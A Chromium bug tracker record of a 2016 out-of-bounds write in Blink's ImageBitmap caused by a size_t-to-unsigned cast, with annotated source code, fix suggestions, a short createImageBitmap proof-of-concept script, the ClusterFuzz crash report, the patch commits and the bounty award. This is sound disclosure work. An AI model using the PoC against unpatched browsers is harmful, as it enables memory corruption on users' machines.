# Security: Bad-Casting in ArrayBuffer resulting in Out-Of-Bounds write vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [40085928](https://issues.chromium.org/issues/40085928) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Canvas |
| **Reporter** | [Deleted User] |
| **Assignee** | xi...@chromium.org |
| **Created** | 2016-11-10 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

The `ArrayBuffer` is prone to an Bad-Casting, which result in out-of-bounds write vulnerability.

## File <https://crrev.com/ed808c40c0aec0e83b0d8ef8d4158f65c3bf4540/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#536>

## 536 ImageBitmap::ImageBitmap(ImageData\* data, 537 Optional<IntRect> cropRect, 538 const ImageBitmapOptions& options) { 539 // TODO(xidachen): implement the resize option 540 IntRect dataSrcRect = IntRect(IntPoint(), data->size()); 541 ParsedOptions parsedOptions = 542 parseOptions(options, cropRect, data->bitmapSourceSize()); 543 if (dstBufferSizeHasOverflow(parsedOptions)) <----- Overflow Checking 544 return; ... 569 RefPtr<ArrayBuffer> dstBuffer = ArrayBuffer::createOrNull( <----- `ArrayBuffer::createOrNull` call allocate a buffer (bug is here) 570 static\_cast<size\_t>(parsedOptions.cropRect.height()) \* <----- Allocation-Size (user-controlled) 571 parsedOptions.cropRect.width(), 572 bytesPerPixel); 573 if (!dstBuffer) 574 return; 575 RefPtr<Uint8Array> copiedDataBuffer = 576 Uint8Array::create(dstBuffer, 0, dstBuffer->byteLength()); ... 604 dstStartCopyPosition = (dstPoint.y() + i) \* dstPixelBytesPerRow + <----- OOB-Offset (user-controlled) 605 dstPoint.x() \* bytesPerPixel; 606 for (size\_t j = 0; j < srcEndCopyPosition - srcStartCopyPosition; 607 j++) { 608 // swizzle when necessary 609 if (kN32\_SkColorType == kBGRA\_8888\_SkColorType) { 610 if (j % 4 == 0) 611 copiedDataBuffer->data()[dstStartCopyPosition + j] = <----- OOB-Write (user-controlled) 612 srcAddr[srcStartCopyPosition + j + 2]; ...

## File <https://crrev.com/ed808c40c0aec0e83b0d8ef8d4158f65c3bf4540/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#110>

## 110 bool dstBufferSizeHasOverflow(ParsedOptions options) { 111 CheckedNumeric<size\_t> totalBytes = options.cropRect.width(); <---- CheckedNumeric with `size_t` 112 totalBytes \*= options.cropRect.height(); 113 totalBytes \*= options.bytesPerPixel; 114 if (!totalBytes.IsValid()) 115 return true; 116 if (!options.shouldScaleInput) 117 return false; 118 totalBytes = options.resizeWidth; 119 totalBytes \*= options.resizeHeight; 120 totalBytes \*= options.bytesPerPixel; 121 if (!totalBytes.IsValid()) 122 return true; 123 return false; 124 }

## File <https://crrev.com/ed808c40c0aec0e83b0d8ef8d4158f65c3bf4540/third_party/WebKit/Source/wtf/typed_arrays/ArrayBuffer.h#145>

## 145 PassRefPtr<ArrayBuffer> ArrayBuffer::createOrNull(unsigned numElements, <---- `unsigned`!! 146 unsigned elementByteSize) { 147 return createOrNull(numElements, elementByteSize, 148 ArrayBufferContents::ZeroInitialize); 149 }

An `unsigned` is 32-bit values on 64-bit systems. But `size_t` is 64-bit values on 64-bit systems.  

Therefore, Bad-Casting vulnerability occurs in `ArrayBuffer::createOrNull`.

In my testcase, `height` and `width` are 0x10004.  

So `numElements` will be 0x80010. (0x10004\*0x10004 => 0x100080010 => 0x80010)

This vulnerability is exploitable.  

Because an attacker easily controlled overflow-size, allocation-size, oob-offset and oob-value.

## \* Fix Suggestion 1 (ImageBitmap.cpp)

110 bool dstBufferSizeHasOverflow(ParsedOptions options) {

- 111 CheckedNumeric<size\_t> totalBytes = options.cropRect.width();

- 111 CheckedNumeric<unsigned> totalBytes = options.cropRect.width();  
  
  112 totalBytes \*= options.cropRect.height();  
  
  113 totalBytes \*= options.bytesPerPixel;  
  
  114 if (!totalBytes.IsValid())  
  
  ...  
  
  569 RefPtr<ArrayBuffer> dstBuffer = ArrayBuffer::createOrNull(

- 570 static\_cast<size\_t>(parsedOptions.cropRect.height()) \*

- 570 static\_cast<unsigned>(parsedOptions.cropRect.height()) \*  
  
  571 parsedOptions.cropRect.width(),  
  
  572 bytesPerPixel);

---

## \* Fix Suggestion 2 (ArrayBuffer.h)

- 145 PassRefPtr<ArrayBuffer> ArrayBuffer::createOrNull(unsigned numElements,
- 146 unsigned elementByteSize) {

- 145 PassRefPtr<ArrayBuffer> ArrayBuffer::createOrNull(size\_t numElements,
- 146 size\_t elementByteSize) {  
  
  147 return createOrNull(numElements, elementByteSize,  
  
  148 ArrayBufferContents::ZeroInitialize);  
  
  149 }  
  
  ...

- 179 PassRefPtr<ArrayBuffer> ArrayBuffer::createShared(unsigned numElements,
- 180 unsigned elementByteSize) {

- 179 PassRefPtr<ArrayBuffer> ArrayBuffer::createShared(size\_t numElements,
- 180 size\_t elementByteSize) {  
  
  ...

---

Which one is better? I'm not sure.

**VERSION**  

Tested On,  

Stable (54.0.2840.99) + Windows 10 x64  

asan-linux-release-431202 (56.0.2916.0) + Ubuntu 16.04

## **REPRODUCTION CASE** \* Minimize PoC

<script>
var canvas = document.createElement("canvas");
var ctx = canvas.getContext("2d");
var imageData = ctx.createImageData(1024, 1024);
for (var i=0; i<1024\\*1024\\*4; i++)
imageData.data[i] = 0x41;
createImageBitmap(imageData, 0, 0, 0x10004, 0x10004, {premultiplyAlpha:"none"});
</script>

---

I attached as `poc.html`

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Attached as `asan_trace.log` and `windbg_trace.log`

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 308 B)
- [asan_trace.log](attachments/asan_trace.log) (text/plain, 12.8 KB)
- [windbg_trace.log](attachments/windbg_trace.log) (text/plain, 6.0 KB)

## Timeline

### cl...@chromium.org (2016-11-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5727085839777792

### ri...@chromium.org (2016-11-10)

Thanks for the detailed report and poc!

Hey, xidachen@, I see you added some of this overflow checking in https://codereview.chromium.org/2249853008, can you take a look at this?

[Monorail components: Blink>Image]

### xi...@chromium.org (2016-11-11)

[Empty comment from Monorail migration]

[Monorail components: -Blink>Image Blink>Canvas]

### cl...@chromium.org (2016-11-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727085839777792

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 1
Crash Address: 0x7fa89317c880
Crash State:
  blink::ImageBitmap::ImageBitmap
  blink::ImageBitmap::create
  blink::ImageData::createImageBitmap
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=388749:389333

Minimized Testcase (0.23 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95kj4jm9qpACwkW1hGjcteTAp585mgX-E56DYU3VT4ARsqsmKClkyNx9ui4aTUWIlIIUWe8Kfm-PCxbiC0GOC4-SwhNAr35jQ4_wTH4EF-KA2ZfMbvYN5L0G0LUrh_fpjoSivINCobxjC_kn02dTQoJsCk65A?testcase_id=5727085839777792
<script>
	var canvas = document.createElement("canvas");
	var ctx = canvas.getContext("2d");
	var imageData = ctx.createImageData(1024, 1024);
	createImageBitmap(imageData, 0, 0, 0x10004, 0x10004, {premultiplyAlpha:"none"});
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### sh...@chromium.org (2016-11-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d59a4441697f6253e7dc3f7ae5caad6e5fd2c778

commit d59a4441697f6253e7dc3f7ae5caad6e5fd2c778
Author: xidachen <xidachen@chromium.org>
Date: Mon Nov 14 22:52:49 2016

Prevent bad casting in ImageBitmap when calling ArrayBuffer::createOrNull

Currently when ImageBitmap's constructor is invoked, we check whether
dstSize will overflow size_t or not. The problem comes when we call
ArrayBuffer::createOrNull some times in the code.

Both parameters of ArrayBuffer::createOrNull are unsigned. In ImageBitmap
when we call this method, the first parameter is usually width * height.
This could overflow unsigned even if it has been checked safe with size_t,
the reason is that unsigned is a 32-bit value on 64-bit systems, while
size_t is a 64-bit value.

This CL makes a change such that we check whether the dstSize will overflow
unsigned or not. In this case, we can guarantee that createOrNull will not have
any crash.

BUG=664139

Review-Url: https://codereview.chromium.org/2500493002
Cr-Commit-Position: refs/heads/master@{#431936}

[modify] https://crrev.com/d59a4441697f6253e7dc3f7ae5caad6e5fd2c778/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-invalid-args-expected.txt
[modify] https://crrev.com/d59a4441697f6253e7dc3f7ae5caad6e5fd2c778/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-invalid-args.html
[modify] https://crrev.com/d59a4441697f6253e7dc3f7ae5caad6e5fd2c778/third_party/WebKit/Source/core/frame/ImageBitmap.cpp


### xi...@chromium.org (2016-11-15)

[Empty comment from Monorail migration]

### xi...@chromium.org (2016-11-15)

govind@: could you please take a look at this bug and see whether this fix should be merged to M55 or not.

### sh...@chromium.org (2016-11-15)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-11-15)

awhalley@, could you ptal https://crbug.com/chromium/664139#c9 and reply please. Thank you.

### aw...@chromium.org (2016-11-16)

Let's give this just a little longer to bake - but it's a simple fix to a bad bug so yes, we should take it in M55. Tagging ReleaseBlock-Stable.

### cl...@chromium.org (2016-11-18)

ClusterFuzz has detected this issue as fixed in range 431896:432166.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727085839777792

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 1
Crash Address: 0x7fa89317c880
Crash State:
  blink::ImageBitmap::ImageBitmap
  blink::ImageBitmap::create
  blink::ImageData::createImageBitmap
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=388749:389333
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=431896:432166

Minimized Testcase (0.23 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95kj4jm9qpACwkW1hGjcteTAp585mgX-E56DYU3VT4ARsqsmKClkyNx9ui4aTUWIlIIUWe8Kfm-PCxbiC0GOC4-SwhNAr35jQ4_wTH4EF-KA2ZfMbvYN5L0G0LUrh_fpjoSivINCobxjC_kn02dTQoJsCk65A?testcase_id=5727085839777792
<script>
	var canvas = document.createElement("canvas");
	var ctx = canvas.getContext("2d");
	var imageData = ctx.createImageData(1024, 1024);
	createImageBitmap(imageData, 0, 0, 0x10004, 0x10004, {premultiplyAlpha:"none"});
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### aw...@chromium.org (2016-11-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-21)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-11-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-23)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-11-23)

Approving merge to M55 branch 2883 based on https://crbug.com/chromium/664139#c13 and per chat with awhalley@. Please merge ASAP. Thank you.

### bu...@chromium.org (2016-11-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9c2617e82d77a72987eff9b241e407289a0536b6

commit 9c2617e82d77a72987eff9b241e407289a0536b6
Author: Xida Chen <xidachen@chromium.org>
Date: Wed Nov 23 02:03:09 2016

Prevent bad casting in ImageBitmap when calling ArrayBuffer::createOrNull

Currently when ImageBitmap's constructor is invoked, we check whether
dstSize will overflow size_t or not. The problem comes when we call
ArrayBuffer::createOrNull some times in the code.

Both parameters of ArrayBuffer::createOrNull are unsigned. In ImageBitmap
when we call this method, the first parameter is usually width * height.
This could overflow unsigned even if it has been checked safe with size_t,
the reason is that unsigned is a 32-bit value on 64-bit systems, while
size_t is a 64-bit value.

This CL makes a change such that we check whether the dstSize will overflow
unsigned or not. In this case, we can guarantee that createOrNull will not have
any crash.

BUG=664139

Review-Url: https://codereview.chromium.org/2500493002
Cr-Commit-Position: refs/heads/master@{#431936}
(cherry picked from commit d59a4441697f6253e7dc3f7ae5caad6e5fd2c778)

Review URL: https://codereview.chromium.org/2524673005 .

Cr-Commit-Position: refs/branch-heads/2883@{#652}
Cr-Branched-From: 614d31daee2f61b0180df403a8ad43f20b9f6dd7-refs/heads/master@{#423768}

[modify] https://crrev.com/9c2617e82d77a72987eff9b241e407289a0536b6/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-invalid-args-expected.txt
[modify] https://crrev.com/9c2617e82d77a72987eff9b241e407289a0536b6/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-invalid-args.html
[modify] https://crrev.com/9c2617e82d77a72987eff9b241e407289a0536b6/third_party/WebKit/Source/core/frame/ImageBitmap.cpp


### xi...@chromium.org (2016-11-23)

Done, merged

### aw...@chromium.org (2016-11-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-29)

Congratulations!  The panel decided this was a high quality report and awarded $5,000 for it.

### aw...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/664139?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085928)*
